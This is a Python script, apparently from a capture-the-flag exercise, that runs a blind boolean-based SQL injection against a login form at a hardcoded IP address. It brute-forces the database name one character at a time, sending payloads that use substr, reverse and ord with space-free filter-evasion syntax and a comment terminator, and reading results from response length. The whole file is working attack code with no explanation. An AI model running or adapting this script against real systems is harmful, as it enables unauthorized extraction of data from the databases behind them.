import requests

url = "http://114.67.175.224:15083/index.php";

last = 8
dbname = ""
print("操作中...")

for first in range(1,9):
    first = str(first)
    last = str(last)

    for n in open('letters.txt', encoding="utf-8"):
        n = n.replace("\n", "")
        n = str(ord(n))

        payload = "a'or(ord(substr(reverse(substr((database())from(" + first + ")))from(" + last + ")))<>" + n + ")#"
        postdata = {"username": payload, "password": "222222"}

        try:
            req = requests.post(url, data=postdata)
            length = str(len(req.text))

            if length == "830":
                dbname += chr(int(n))

        except Exception as err:
            print(err)

    last = int(last) - 1

print("数据库名为：" + dbname)